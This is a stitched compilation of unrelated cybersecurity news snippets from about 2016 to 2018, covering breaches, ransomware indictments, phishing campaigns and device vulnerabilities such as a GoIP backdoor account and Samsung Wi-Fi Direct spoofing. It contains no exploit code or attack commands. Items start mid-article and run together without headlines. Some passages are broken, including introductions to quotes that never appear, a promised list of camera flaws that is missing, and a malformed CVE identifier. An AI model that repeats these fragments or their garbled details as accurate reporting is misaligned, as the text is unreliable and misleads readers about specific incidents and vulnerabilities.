All of the 18 vulnerabilities found by Cisco Talos, as well as many others fixed by this update, are labeled as critical because they could lead to code execution. This would allow attackers to create specially crafted web pages or PDFs that could exploit these vulnerabilities to execute commands or install malware on vulnerable computers.
Of the 18 vulnerabilities disclosed by Cisco, 12 of them could be exploited simply by visiting a web site when the Foxit PDF browser plugin is enabled.
Foxit suggests that all users of Foxit PDF Reader and Foxit PhantomPDF upgrade to version 9.3 to resolve these vulnerabilities. Foxit PDF Reader 9.3 can be downloaded here and Foxit PhantomPDF can be downloaded here. It is strongly suggested that all users install this update.

The new unlimited data plan from Verizon isn’t bad.
Following a couple of Superbowl ads from competitors Sprint and T-Mobile that made fun of it for the taxes, fees, rates, and lack of unlimited data it inflicts on its customers, Verizon gave up and joined the unlimited data party with an $80 plan (on down to $45 for each of four lines: here are the details).
Since last week, when the new unlimited plan was announced, various fake Verizon Unlimited Twitter accounts have appeared, and phishers have likewise been sending out bogus offers to upgrade.
All you have to do is retweet the offer, or click and go fill in your details.
Product Reviews captured one fake Twitter account that was offering Verizon Unlimited “FREE for 12 months” in exchange for retweets.
The @VZUnlimited account, which wasn’t verified but bore Verizon’s logo and was named Verizon Unlimited, has since been suspended, as have other scam accounts.
Verizon has been warning customers about a variety of phishing email scams, providing a list of scam samples that goes back to 2014.
The most recent addition to that list was a phishing message dated this past Sunday.
Coming from an email account name of “Verizon Online”, the message told recipients that Verizon would be replacing its “Classic” version of email service with a new, updated version as of Monday.

Nearly half of businesses report that they were the subject of a cyber-ransom campaign in 2016, according to Radware's Global Application and Network Security Report 2016-2017.
Data loss topped the list of IT professionals' cyber attack concerns, the report found, with 27% of tech leaders reporting this as their greatest worry.
It was followed by service outage (19%), reputation loss (16%), and customer or partner loss (9%).
Malware or bot attacks hit half of all organizations surveyed in the last year.
Some 55% of respondents reported that IoT ecosystems had complicated their cybersecurity detection measures, as they create more vulnerabilities.
Ransomware attacks in particular continue to increase rapidly: 41% of respondents reported that ransom was the top motivator behind the cyber attacks they experienced in 2016.
Meanwhile, 27% of respondents cited insider threats, 26% said political hacktivism, and 26% said competition.

While large-scale DDoS attacks dominated the headlines of 2016, this report found that only 4% of all attacks were more than 50 Gbps, while more than 83% of DDoS attacks reported were under 1 Gbps.
""One thing is clear: Money is the top motivator in the threat landscape today,"" said Carl Herberger, vice president of security solutions at Radware, in a press release.
""Attackers employ an ever-increasing number of tactics to steal valuable information, from ransom attacks that can lock up a company's data, to DDoS attacks that act as a smoke screen for information theft, to direct brute force or injection attacks that grant direct access to internal data.""
Despite the growth in attacks, some 40% of organizations reported that they do not have an incident response plan in place, the survey found.

Hackers made hay of the sorry state of credential security in 2016.
They stole millions of username and password combinations from online services of all shapes and sizes.
Blogs and discussion forums were hit particularly hard.
Exploiting credentials is an old attack vector that still works wonders for hackers.
In its 2016 Data Breach Investigations Report (DBIR), Verizon added a section about credentials, revealing that 63% of data breaches involved weak, default or stolen passwords.
“This statistic drives our recommendation that this is a bar worth raising,” reads the report.
Why is it so easy for cybercriminals to plunder login credentials?
End users, despite constant warnings, continue re-using passwords, allowing hackers to conveniently break into multiple accounts after stealing someone's credentials once.
It's like having one key for your bike lock, front door, office building, car and bank box.
Meanwhile, more software vendors should provide advanced hashing, salting and other scrambling technologies for protecting credential information in case it's stolen.
For example, attackers hacked Clash of Kings' forum after exploiting a known vulnerability in an outdated version of the vBulletin software.
The thieves stole personal information from 1.6 million user accounts, including scrambled passwords.
In one case, an attacker used misplaced install files to gain admin privileges.
In another case, hackers stole one moderator's credentials and used the account to post a malicious message in the forum.
After viewing the message, the forum's administrator had his account compromised, leading to a massive breach.
Notable vulnerabilities exploited in recent years include CVE-2016-6483, CVE-2016-6195, CVE-2016-6635, CVE-2015-1431, CVE-2015-7808, CVE-2014-9574 and CVE-2013-6129.

Spiral Toys, the parent company behind CloudPets, yesterday sent the California Attorney General a breach notification that on many fronts contradicts what experts have said about a database breach that exposed user data and private voice messages, many of which were made by children.
The notification says that the company was not aware of a breach until Feb 22 when it received an inquiry from a Motherboard reporter who was informed by researchers Troy Hunt and Victor Gevers of a serious issue involving the toymaker’s customer data.
This runs contrary to timelines provided by Hunt and Gevers showing both reached out to a number of Spiral Toys contacts, including its ZenDesk ticketing system, around Dec 30.
The data was copied and deleted from an exposed MongoDB instance found online.
It’s unknown how many times the database was accessed before its contents were deleted and a ransom note left behind, symptomatic of other attacks against poorly protected MongoDB databases.
The recordings were not stored in the database, but the database did contain references to file paths to the messages, which were stored on an Amazon Web Services AWS S3 storage bucket.
The database, Spiral Toys said in its notification, did include emails and encrypted passwords, which Hunt counters were not encrypted, but were hashed with bcrypt.
Combined with a nonexistent password strength rule on Spiral Toys’ part, the hashed passwords could easily be cracked, Hunt said.
The company meanwhile said it would notify 500,000 affected users, force a password reset, and implement new password strength requirements.
Hunt and Gevers said there were actually more than 800,000 registered users exposed in the breach.
“The breach has been addressed and from our best knowledge no images or messages were leaked onto the internet,” Spiral Toys said.
“A hacker could get to that data if they started ‘guessing’ simple passwords”.
Which is exactly what a hacker would do, Hunt said.
“This is what hash cracking is and it’s a highly automated process that’s particularly effective against databases that had no password rules,” Hunt said.
Hunt points out that simple passwords such as qwe—a sample password shown during a CloudPets setup video—combined with the stolen email addresses pose a serious privacy risk.
CloudPets are teddy bears that can send and receive messages using Bluetooth Low Energy connectivity to a mobile app, which sends the messages.
The most typical use case is where a child can remotely send a message to a parent or authorized adult through the bear.
“If this product was secure, it would have been a nice contribution to the IOT/gadget/toy market,” Gevers said.
The best thing is that they learn from this and start making a new secure product line”.

U.S. intelligence agencies recently identified a Russian cybersecurity firm, which has expertise in testing the network vulnerabilities of the electrical grid, financial markets and other critical infrastructure, as having close ties to Moscow’s Federal Security Service, the civilian intelligence service.
The relationship between the company and the FSB, as the spy agency is known, has heightened fears among U.S. cyberintelligence officials that Moscow is stepping up covert efforts to infiltrate computer networks that control critical U.S. infrastructure such as oil and gas pipelines and transportation.
The Russian company is taking steps to open a U.S. branch office as part of the intelligence-gathering, said officials familiar with reports of the effort who spoke on background.
Officials familiar with reports about the company did not identify it by name.
However, security officials are quietly alerting government security officials and industry cybersecurity chiefs about the Russian firm and its covert plans for operations in the United States.
The Russian firm is said to have extensive technical experience in security vulnerabilities of supervisory control and data acquisition systems that are used to remotely control critical infrastructure.
These systems are employed by both government and private-sector system controllers for equipment running water treatment and distribution, wastewater collection and treatment, oil and gas pipelines, electrical power grids, wind farms and large communication systems.

There are so many data breaches these days that it’s almost impossible to keep a track of them. From billions of Yahoo accounts to millions of LinkedIn and MySpace accounts the whole thing is out of control.
But then there are people dedicating time to track large-scale breaches. One of them is Troy Hunt from Australia whose running Have I been pwned (HIBP) platform and has recently discovered two different “combo lists” containing 593,427,119 and 457,962,538 = 1,051,389,657 user login credentials.
According to Hunt blog post,
While discussing the second list Hunt said that: 
For now, Hunt has uploaded over 1 billion breached accounts on HIBP containing collections of email addresses and passwords from around the world, the authentication of which has been confirmed by Hunt himself. Although unconfirmed yet, it seems like the hackers, scammers, and cybercriminals developed these lists from various systems and previous large-scale data breaches including VerticalScope, MySpace, LinkedIn, Twitter, Dropbox, Yahoo, Tumblr and Adobe Systems etc.
Hunt has also revealed, “75.78% of the leaked addresses were already in HIBP database.” This means the lists were defiantly developed with the help of previous data breaches. As a security journalist, I can confirm my personal email account is also on the list.

Unfortunately, Yahoo didn't, according to a new internal investigation.
The internet pioneer, which reported a massive data breach involving 500 million user accounts in September, actually knew an intrusion had occurred back in 2014, but allegedly botched its response.
The findings were made in a Yahoo securities exchange filing on Wednesday that offered more details about the 2014 breach, which the company has blamed on a state-sponsored hacker.
That breach, which only became public last year, involved the theft of user account details such as email addresses, telephone numbers, and hashed passwords.
After Yahoo went public with it, the company established an independent committee to investigate the matter.
The committee found that Yahoo’s security team and senior executives actually knew that a state-sponsored actor had hacked certain user accounts back in 2014, according to the filing.
But even as the company took some remedial actions, such as notifying 26 users targeted in the hack and adding new security features, some senior executives allegedly failed to comprehend or investigate the incident further.
For instance, in December 2014, Yahoo's security team knew the state-sponsored actor had stolen copies of backup files that contained users' personal data.
But it's unclear whether this information was ever ""effectively communicated and understood"" outside the security team, Wednesday's filing said.
No intentional suppression of information was found, although Yahoo's legal team had enough reason to investigate the breaches further, the committee concluded.
""As a result, the 2014 security Incident was not properly investigated and analyzed at the time,"" the filing said.
It was only about two years later when Yahoo publicly disclosed the breach.
That came after a stolen database from the company allegedly went up for sale on the black market.
However, after Yahoo disclosed the breach, a few months later, the company learned of an even bigger hack that involved 1 billion Yahoo user accounts and further rocked the company's reputation.
That breach originally occurred in August 2013 but wasn’t noticed until law enforcement provided Yahoo with a copy of the stolen data last November.
According to Wednesday's filing, Yahoo still hasn’t learned how this data was stolen, although it appears to be separate from the 2014 breach.
In addition, the company has been investigating an another incident involving a hacker forging cookies as a way to break into user accounts.
Wednesday's filing said that about 32 million user accounts were affected.

The US Attorney's Office for the District of Northern Georgia announced Wednesday that a federal grand jury had returned indictments against two Iranian nationals charged with executing the March 2018 ransomware attack that paralyzed Atlanta city government services for over a week. Faramarz Shahi Savandi and Mohammed Mehdi Shah Mansouri are accused of using the Samsam ransomware to encrypt files on 3,789 City of Atlanta computers, including servers and workstations, in an attempt to extort Bitcoin from Atlanta officials.
Details leaked by City of Atlanta employees during the ransomware attack, including screenshots of the demand message posted on city computers, indicated that Samsam-based malware was used. A Samsam variant was used in a number of ransomware attacks on hospitals in 2016, with attackers using vulnerable Java Web services to gain entry in several cases. In more recent attacks, including one on the health industry companies Hancock Health and Allscripts, other methods were used to gain access, including Remote Desktop Protocol hacks that gave the attackers direct access to Windows systems on the victims' networks.
The Atlanta attack was not a targeted state-sponsored attack. The attackers likely chose Atlanta based on a vulnerability scan. According to the indictment, the attackers offered the city the option of paying six Bitcoin (currently the equivalent of $22,500) to get keys to unlock all the affected systems or 0.8 Bitcoin (about $3,000) for individual systems. ""The ransom note directed the City of Atlanta to a particular Bitcoin address to pay the ransom and supplied a web domain that was only accessible using a Tor browser,"" a Department of Justice spokesperson said in a statement. ""The note suggested that the City of Atlanta could download the decryption key from that website."" But within days of the attack, the Tor page became unreachable, and the City of Atlanta did not pay the ransom.
Savandi, 27, of Shiraz, Iran, and Mansouri, 34, of Qom, Iran, have been charged under the Computer Fraud and Abuse Act (CFAA) for ""intentional damage to protected computers... that caused losses exceeding $5,000, affected more than 10 protected computers, and that threatened the public health and safety,"" the Justice Department spokesperson said. They are also charged in a separate indictment in the US District Court for the District of New Jersey in connection with another ransomware attack, in which a ransom was apparently paid.

A wave of cyberattacks is targeting organisations' financial departments with a social engineering and phishing campaign designed to trick victims into downloading credential-stealing malware and other threats.
Detailed by researchers at Barracuda Networks, the invoice impersonation attacks aim to persuade the victim that the messages are from trusted sources, or to act on impulse -- planting the idea that the target has lost money is a common tactic in phishing emails, as it creates panic for the user.
The victim thinks they are reacting to an important request when all they're doing is playing right into the hands of the attackers.
A new wave of these attacks involves attackers sending status updates for invoices -- but these don't just involve threat actors firing off millions of messages at random and hoping for the best; they're specially crafting the attacks to look authentic and crucially, from someone the target might trust.
In one example of this attack, the target receives an email asking for a reply to a query about the payment status of an invoice. A legitimate-looking invoice number is provided in the subject line and the sender's name is chosen to be someone the recipient knows. 
Mimicking someone the victim knows suggests the attackers are already familiar with the target and their network -- this information could simply have been scraped from a public profile such as LinkedIn or it could indicate that the attackers already have a foothold in the network which they're looking to exploit for further gains.
The message might look legitimate at first glance -- especially for someone quickly scanning emails in a high-paced financial environment -- but the invitation to click on a link to respond to the supposed status should be treated with suspicion.
But if a recipient does click through, the link will download a Word document supposedly containing the invoice -- which then goes onto install malware onto the system. It could be subtle, like a trojan or the victim could recognise their error immediately if faced with ransomware.
The attackers aren't just using a single template in the campaign, researchers have spotted other lures used in an effort to distribute a malicious payload.
A second invoice impersonation attack uses the subject 'My current address update' and claims to contain information from a trusted contact about a change of address, along with details of a new invoice. 
Once again, the victim is encouraged to click through a link to download the document from a malicious host with the end result again being an infection with malware, credential theft or a compromised account.
The attacks might seem simple, but those behind them wouldn't be deploying them if they didn't work.
""Impersonation is a proven tactic that criminals are regularly using to attract victims into believing that they are acting on an important message, when that couldn't be further from the truth,"" said Lior Gavish, VP at Barracuda Networks.
When it comes to protection against this type of attack, employee training can go a long way, especially if they're provided with a sandbox environment.

Researchers at Trustwave are warning of a hidden backdoor in VoIP devices produced by Chinese manufacturer DBL Technology which could allow access by the manufacturer or malicious third parties.
The issue is with the authentication process, allowing a remote attacker to gain a shell with root privileges on an affected device, Trustwave researcher Neil Kettle explained in a blog post.
“The Telnet interface of the GoIP is documented as providing information for users of the device through the use of logins ‘ctlcmd’ and ‘limitsh’.
However, an additional undocumented user, namely ‘dbladm’ is present which provides root level shell access on the device.
Instead of a traditional password, this account is protected by a proprietary challenge-response authentication scheme,” he explained.
“Investigation has shown this scheme to be fundamentally flawed in that it is not necessary for a remote user to possess knowledge of any secret besides the challenge itself and knowledge of the protocol/computation”.
This is apparently in contrast to more secure challenge-response schemes such as password-based log-ins where the user is asked for a password, which is then obscured to guard against “network interception and replay attacks”.
The issue was first spotted by Trustwave in an 8 port VoIP GSM Gateway from the company.
However, it’s since been discovered present in GoIP 1, 4, 8, 16 and 32 and could affect many more DBL Technology devices and OEM kit.
More worryingly, when contacted last October, the firm did not fix the issue.
“Verification of the patched version reveals that the challenge response mechanism is still present in the latest version albeit a little more complex.
It seems DBL Technology engineers did not understand that the issue is the presence of a flawed challenge response mechanism and not the difficulty of reverse engineering it,” explained Kettle.
“The main differences between the latest challenge response mechanism and the older variant is the level of complexity it employs: a simplistic MD5 with a linear equation changed to several 'round' functions mixed with a modified version of the MD5 hash algorithm”.

Huawei has just announced a new vulnerability that is currently possible on both the Huawei Honor 7 and the Huawei Mate S. This is said to be a privilege elevation vulnerability that is possible thanks to an arbitrary file upload in Huawei Themes.
The vulnerability already has an update ready to fix it and devices susceptible to this simply needs to apply the latest update to be safe from it.
As of right now, we don’t have any details about how quickly this update is going out to devices though.
Huawei tells us this vulnerability was initially reported to Huawei PSIRT by Nicky (Wu Huiyu).
Nicky works in Tencent’s Security Platform Department and is responsible for finding vulnerabilities in various products and services.
We’re told Mr. Wu followed proper protocol to contact Huawei and coordinated the vulnerability disclosure so they can keep their customers as safe as possible.
We’re told this vulnerability impacts the Huawei Honor 7 that is running software versions newer than PLK-UL00C17B385.
Meaning, if you have the Honor 7 from Huawei and have the PLK-UL00C17B385 firmware (or newer), then your device is safe from this attack.
This attack is also possible on the Huawei Mate S, but it was fixed in software version CRR-L09C432B380.
So again, if you have the Mate S from Huawei and are running the CRR-L09C432B380 firmware (or newer), then you’re safe as well.
This was not a remote attack and you were only at risk when certain conditions were met.
You would have had to have someone trick you into installing a malicious theme on your device for it to infect it.
This was possible because of a lack of a “theme pack check” since it allowed the theme to include some malicious files which would have been executed once installed.

IP cameras manufactured by Chinese vendor Fosscam are riddled with security flaws that allow an attacker to take over the device and penetrate your network.
The issues came to light yesterday when Finnish cyber-security firm F-Secure published its findings after Fosscam failed to answer bug reports and patch its firmware.
Below is a list of 18 vulnerabilities researchers discovered in Fosscam IP cameras:
The variety of issues F-Secure researchers discovered means there are multiple ways an attacker can hack one of these devices and use it for various operations.
""For example, an attacker can view the video feed, control the camera operation, and upload and download files from the built-in FTP server,"" F-Secure says. "" They can stop or freeze the video feed, and use the compromised device for further actions such as DDoS or other malicious activity.""
""If the device is in a corporate local area network, and the attacker gains access to the network, they can compromise the device and infect it with a persistent remote access malware. The malware would then allow the attacker unfettered access to the corporate network and the associated resources,"" researchers added.
F-Secure researchers say all these vulnerabilities have been confirmed in Fosscam C2 models, but also in Opticam i5, an IP camera sold by another vendor, but based on a white-label Fosscam device.
In fact, researchers suspect that Fosscam has sold the vulnerable IP camera model as a white-label product, which other companies bought, plastered their logo on top, and resold as their own devices. F-Secure says it identified 14 other vendors that sell Fosscam made cameras, but they have not tested their products as of yet.
F-Secure recommends that network administrators remove any Fosscam made IP camera from their network until the Chinese company patches its firmware.

Over a quarter of a million devices used with DVRs around the globe are susceptible to a new botnet its discoverers have dubbed Amnesia.
Unit 42 researchers at Palo Alto Networks announced on Thursday their detection of a new variant of the IoT/Linux botnet Tsunami, which they are referring to as Amnesia.
The Amnesia botnet looks for an unpatched remote code execution vulnerability affecting DVR (digital video recorder) appliances manufactured by China-based TVT Digital and identified in nearly identical products from more than 70 global vendors.
Unit 42 is claiming that the flaw is impacting about 227,000 devices all over the planet, with Taiwan, the United States, Israel, Turkey, and India being the most susceptible.
Further, the researchers believe this is the first Linux malware to adopt virtual machine evasion techniques to defeat malware analysis sandboxes.
Not only that, should the code recognize it has reached into VirtualBox, VMware or a QEMU-based virtual machine, it will wipe the virtualized Linux system by deleting all the files in file system, the post stated.
""This affects not only Linux malware analysis sandboxes but also some QEMU based Linux servers on VPS or on public cloud,"" the researchers said.
The power is in how the malware can exploit the remote code execution vulnerability to scan for, locate and attack vulnerable systems.
Once connected, the malware enables the remote attackers to gain full control of the affected device.
The researchers speculate that bad actors could potentially use the Amnesia botnet to launch wide-scale DDoS attacks on a scale previously seen in the fall 2016 with the Mirai botnet.
Apparently, no patches have yet been issued to address the flaw, the researchers said.
As to why a patch has yet to be issued to fix this year-old flaw, Ryan Olson, intelligence director of Unit 42 at Palo Alto Networks, told SC Media on Thursday that it's up to the manufacturer to create a patch.
His team hasn't found any evidence they have released one.
The vulnerable DVRs are typically connected to closed circuit TV (CCTV) equipment, which are often installed in offices and stores, Olson said.
""The people operating these should limit access to those devices from the internet so they are not exposed to potential malicious actors.""
This, he added, is typically accomplished using a firewall that stops the traffic before it reaches the vulnerable device.
The fact that the actors behind this malware are using VM-detection mechanisms in a Linux malware family indicates that they likely have prior experience creating malware, Olson explained.
The good news is that no large-scale attacks have yet been launched using the Amnesia botnet, though judging by the harm from Mirai, the researchers at Palo Alto warned the damage large-scale IoT-based botnets could do is substantial.
They recommended users have ""the latest protections"" installed and to block traffic to Amnesia's command-and-control server (listed in their post).

After scrambling to patch a critical vulnerability late last month, Drupal is at it again.
The open source content management project has issued an unscheduled security update to augment its previous patch for Drupalgeddon2.
There was also a cross-site scripting bug advisory in mid-April.
The latest Drupal core vulnerability, designated, SA-CORE-2018-004 and assigned CVE-2018-7602, is related to the March SA-CORE-2018-002 flaw (CVE-2018-7600), according to the Drupal security team. It can be exploited to take over a website's server, and allow miscreants to steal information or alter pages.
""It is a remote code execution vulnerability,"" explained a member of the Drupal security team in an email to The Register. ""No more technical details beyond that are available.""
The vulnerability affects at least Drupal 7.x and Drupal 8.x. And a similar issue has been found in the Drupal Media module.
In a blog post from earlier this month about the March patch, Dries Buytaert, founder of the Drupal project, observed that all software has security issues and critical security bugs are rare.
While the March bug is being actively exploited, the Drupal security team says it's unaware of any exploitation of the latest vulnerability. But it won't be long – those maintaining the project observed automated attacks appearing about two weeks after the SA-CORE-2018-002 notice.
The fix is to upgrade to the most recent version of Drupal 7 or 8 core. The latest code can be found at Drupal's website.
For those running 7.x, that means upgrading to Drupal 7.59. For those running, 8.5.x, the latest version if 8.5.3.
And for those still on 8.4.x, there's an upgrade to 8.4.8, despite the fact that as an unsupported minor release, the 8.4.x line would not normally get security updates. And finally, if you're still on Drupal 6, which is no longer officially supported, unofficial patches are being developed here.
Drupal users appear to be taking the release in stride, though with a bit of grumbling.

 Microsoft has released a patch for a critical remote code execution flaw affecting a Windows service used for importing Docker container images.
The vulnerability, tracked as CVE-201808115, is due to the Windows Host Compute Service Shim (hcsshim) library not properly validating input from container images while importing them.
A remote attacker could execute malware on a Windows host using a malicious Docker container image if they managed to trick an authenticated administrator to import it in Docker for Windows, which uses the hcsshim library.
""An attacker who successfully exploited the vulnerability could execute arbitrary code on the host operating system,"" Microsoft notes in its advisory.
The vulnerability hasn't been publicly disclosed.
 Anyone using Docker for Windows can resolve the issue today by installing version 0.6.10 of hcsshim. The patch is available from Microsoft's security advisory or from Microsoft's GitHub page.
Hcsshim, which is written in Go, is an open-source wrapper that Microsoft developed for use with its Host Compute Service, a container management API in Windows Hyper-V virtualization for Docker.
The HCS abstraction layer is Microsoft's way of allowing Docker containers to use Linux kernel features on Windows, such as Linux Namespaces and Control Groups.
Hanselmann explains that the flaw stems from hccshim's use of a function from Go and the failure to sanitize input from an imported container image.
""Its use of Go's filepath.Join function with unsanitized input [made it possible] to create, remove and replace files in the host file system, leading to remote code execution,"" he noted.
""Importing a Docker container image or pulling one from a remote registry isn't commonly expected to make modifications to the host file system outside the Docker-internal data structures.""
Separately, Microsoft is reportedly working on a fix for a ""fatal flaw"" in its initial Windows 10 fix for the Meltdown CPU vulnerability. It's been patched in the new Windows 10 April 2018 Update, according to Alex Ionescu, chief architect at Crowdstrike, but hasn't been backported to previous versions of Windows 10.

The bad guys send along a URL, since removed, that perfectly mirrors the real Australian site with the email requesting the person verify their identity, according to Malwarebytes.
Once on the fake landing page the victim is asked to input their login credentials, then the crooks take the unusual, and nervy, step of asking for many different pieces of information.
Malwarebytes said the fake site asks for a high-resolution image, front and back, of the person's driver's license, passport be uploaded.
But the bad guys are not satisfied even with this gift, they then ask for the victim to link their banking account with the site and supply account numbers, mother's maiden name, phone number and telephone passcode.
An SMS text is then sent to the person's phone to “confirm” that everything is legitimate.

A handful of worrisome vulnerabilities in Honeywell building automation system software disclosed last week are case in point of how far the industry continues to lag in securing SCADA and industrial control systems.
Honeywell published in September new firmware that patches vulnerabilities privately disclosed by researcher Maxim Rupp in its XL Web II controllers.
The flaws could give an attacker the ability to access relatively unprotected credentials and use those to manipulate, for example, environmental controls inside a building.
While these aren’t critical infrastructure systems such as wastewater, energy or manufacturing, building automation system hacks can be expensive to remedy, and in a worst-case scenario, afford an attacker the ability to pivot to a corporate network.
Experts told Threatpost that building automation systems can be used to remotely manage heating, air conditioning, water, lighting and door security, and help reduce building operations costs.
They’re also popping up as more and more buildings go green; such systems, for example, are crucial to Leadership in Energy and Environmental Design (LEED) certification from the United States Green Building Council.
“The main risk from this is a super simple method of accessing building system HMIs, whether for mischief or maybe even ransom.
Controllers like this provide an easy interface to operating the entire building system, no additional programming knowledge or protocol expertise required,” said Michael Toecker of Context Information Security.
Unless very poorly designed, a user can’t damage equipment from the HMI, but they can make the building inhospitable, inefficient, and expensive to fix”.
The Industrial Control System Cyber Emergency Response Team (ICS-CERT) issued an advisory last Thursday warning of five vulnerabilities in the Honeywell XL1000C500 XLWebExe-2-01-00 and prior, and XLWeb 500 XLWebExe-1-02-08 and prior.
Four of the five are authentication-related flaws, the most serious of which involved passwords either stored in clear text or reachable by accessing a particular URL.
A user with low privileges could also open and change parameters via a URL, ICS-CERT said.
Honeywell also patched a session fixation vulnerability allowing an attacker to establish new users sessions without invalidating prior sessions, giving them access to authenticated sessions.
It also patched a path traversal bug that allowed attackers to carry out directory traversal attacks via a URL.

Billions of online credentials freshly stolen in 2016 are fueling a practice of automated login hacks that are overwhelming legitimate human-login traffic on enterprise Web properties.
A study out today from Shape Security shows that it's common for credential-stuffing login attempts to account for more than 90% of all login activity on Internet-facing systems at Fortune 100 firms.
""In working with customers in retail, finance, travel, government, and other industries, Shape has seen millions of instances of credentials from reported breaches being used in credential stuffing attacks,"" the report says.
Online-credential breaches that don't expose any other personally identifiable information may seem like no big deal on the spectrum of massive security incidents.
But the study out today shows that with automation, attackers are using stolen passwords quite effectively.
If attackers have a large enough pool of stolen credentials to try across various other Web systems online, even a very slim success rate can yield them hundreds of thousands - or even millions - of accounts ripe for takeover.
Global organizations in 2016 reported more than 3 billion username and password combinations stolen, led first and foremost by Yahoo's massive 1.5 billion user breach.
""Credential spills became a worldwide pandemic in 2016.
While we have been observing credential spills and credential-stuffing attacks for many years, the scale of both in 2016 was remarkable,"" says Shuman Ghosemajumder, CTO for Shape.
""The size and frequency of credential spills appears to be increasing, with the record for all-time largest credential spill being reset three times last year.""
Shape reports that in its work with retail, finance, travel, government, and other industries in 2016, it observed millions of credentials exposed from reported breaches being used in credential- stuffing attacks.
During one 4-month observation period at a major retailer, for example, Shape Security witnessed 15.5 million account login attempts.
Scarily enough, 500,000 accounts at that retailer were on breached credential lists.
The difficulty with credential stuffing is that many companies don't have visibility into the volume of automated login traffic they're being hit with because these attacks aren't taking advantage of vulnerabilities per se.
They're using the login functionality the way it is supposed to be used, simply scaling up the rate at which the credentials are plugged into the inputs.
These attacks not only put users at risk, but they also put a traffic burden on infrastructure and could add to the login latency for real human users.
""A lot of public attention is focused on any organization that experiences a data breach and loses control of their users' passwords and personal information,"" Ghosemajumder says.
""However, the real issue other companies should focus on is protecting themselves against those passwords being used to attack them and their own users”.

Security researchers from Neseso are sounding the alarm on a vulnerability they've discovered in Samsung smart TVs that Samsung declined to fix.
The security flaw affects Wi-Fi Direct, a Wi-Fi standard that enables devices to connect with each other without requiring a wireless access point.
Smasung uses Wi-Fi Direct with its smart TVs to allow TV owners to connect to the TV via their phones, laptops, or tablets, directly, and not through the local access point.
Neseso researchers claim that Samsung has failed in the implementation of this standard, as Samsung TVs only use MAC addresses to authenticate users. Other vendors use more solid authentication systems based on a Push-Button or PIN.
Because anyone can sniff and spoof MAC addresses, this vulnerability opens the user's TV to getting hacked by anyone in the range of the TV's Wi-Fi Direct coverage.
""Once connected, the attacker has access to all the services provided by the TV, such as remote control service or DNLA screen mirroring,"" Neseso researchers wrote in their report.
The dangers are palpable for companies, as most have smart TVs in their offices, employee lounges, customer waiting rooms, or board rooms.
Worse is that the Samsung smart TV Wi-Fi Direct feature is enabled by default every time the device boots up. Users are notified on screen when a whitelisted device connects to the TV via Wi-Fi Direct, but those warnings could be misinterpreted by TV owners, or missed altogether if nobody's watching the TV.
Contacted by Neseso in mid-March, Samsung answered it doesn't view this feature as a security risk and declined to provide a firmware update, telling Neseso they don't view this issue as a ""security threat.""
Researchers tested their attack on Samsung UN32J5500 Firmware version 1480, but say that other versions are most likely vulnerable as well. There is currently no workaround for protecting against attacks via Wi-Fi Direct except turning off the feature every time you boot/reboot your device.
Earlier this month, at the Security Analyst Summit 2017, security expert Amihai Neiderman disclosed about the presence of 40 zero-day vulnerabilities in Tizen, the operating system that runs on Samsung smart TVs. The flaws were all unpatched at the time they were reported.

The Federal Bureau of Investigation has issued a warning to healthcare organizations using File Transfer Protocol (FTP) servers. Medical and dental organizations have been advised to ensure FTP servers are configured to require users to be properly authenticated before access to stored data can be gained.
Many FTP servers are configured to allow anonymous access using a common username such as ‘FTP’ or ‘anonymous’. In some cases, a generic password is required, although security researchers have discovered that in many cases, FTP servers can be accessed without a password.
The FBI warning cites research conducted by the University of Michigan in 2015 that revealed more than 1 million FTP servers allowed anonymous access to stored data
The FBI warns that hackers are targeting these anonymous FTP servers to gain access to the protected health information of patients. PHI carries a high value on the black market as it can be used for identity theft and fraud.
Healthcare organizations could also be blackmailed if PHI is stolen. Last year, the hacker operating under the name TheDarkOverlord conducted a number of attacks on healthcare organizations. The protected health information of patients was stolen and organizations were threatened with the publication of data if a sizable ransom payment was not made. In some cases, patient data were published online when payment was not received.
There are reasons why IT departments require FTP servers to accept anonymous requests; however, if that is the case, those servers should not be used to store any protected health information of patients. If PHI must be stored on the servers, they cannot be configured to run in anonymous mode.
The FBI suggests all healthcare organizations should instruct their IT departments to check the configuration of their FTP servers to ensure they are not running in anonymous mode and to take immediate action to secure those servers and reduce risk if they are.

HONG KONG (REUTERS) - Cathay Pacific Airways said on Wednesday (Oct 24) that data of about 9.4 million passengers of Cathay and its unit Hong Kong Dragon Airlines had been accessed without authorisation.
Cathay said 860,000 passport numbers, about 245,000 Hong Kong identity card numbers, 403 expired credit card numbers and 27 credit card numbers with no card verification value (CVV) were accessed in the breach.
""We are very sorry for any concern this data security event may cause our passengers,"" Cathay Pacific chief executive Rupert Hogg said in a statement.
""We acted immediately to contain the event, commence a thorough investigation with the assistance of a leading cyber-security firm, and to further strengthen our IT security measures.""
Mr Hogg said no passwords were compromised in the breach and the company was contacting affected passengers to give them information on how to protect themselves.
Cathay Pacific was not immediately available for additional comment outside normal business hours.
The company said it initially discovered suspicious activity on its network in March this year, and investigations in early May confirmed that certain personal data had been accessed.
News of Cathay's passenger data breach comes weeks after British Airways revealed that credit card details of hundreds of thousands of its customers were stolen over a two-week period.
Cathay said in a statement that accessed data includes names of passengers, their nationalities, dates of birth, telephone numbers, e-mail and physical addresses, passport numbers, identity card numbers and historical travel information.
It added that the Hong Kong Police had been notified about the breach and that there is no evidence any personal information has been misused.

An exploit in the Android operating system means almost 40 percent of users are vulnerable to screen-hijacking apps, but it is unlikely to be fixed until winter.
The bug, which was first spotted by researchers at Check Point, is caused by a development oversight in Android permissions, which in the past required users to manually grant downloaded applications the ability to display content on top of other app panes.
However following complaints from users who found it difficult to manually whitelist each app, the Android 6.0.1 'Marshmallow' update made this process automatic, which was good news for legitimate apps like WhatsApp and Facebook Messenger.
It appears that fix has meant apps hiding malicious codes are able to bypass security also being automatically granted the same access, specifically the 'SYSTEM_ALERT_WINDOW' permission. According to Google's own statistics, the vulnerability will be active on close to 40 percent of all Android devices. 
""As a temporary solution, Google applied a patch in Android version 6.0.1 that allows the Play Store app to grant run-time permissions, which are later used to grant SYSTEM_ALERT_WINDOW permission to apps installed from the app store,"" the Check Point research team explained in a blog post. ""This means that a malicious app downloaded directly from the app store will be automatically granted this dangerous permission.""
This permission is particularly dangerous as it allows an app to display over any other app, without notifying the user. This means apps are able to display fraudulent adverts or links to content hosting malicious code, which are heavily used in banking Trojans.
""It can also be used by ransomware to create a persistent on-top screen that will prevent non-technical users from accessing their devices,"" explained the team. This particular permissions exploit is used by 74 percent of all ransomware, 57 percent of adware and 14 percent of banker malware, according to the report, clearly demonstrating that this is a widespread tactic in the wild.
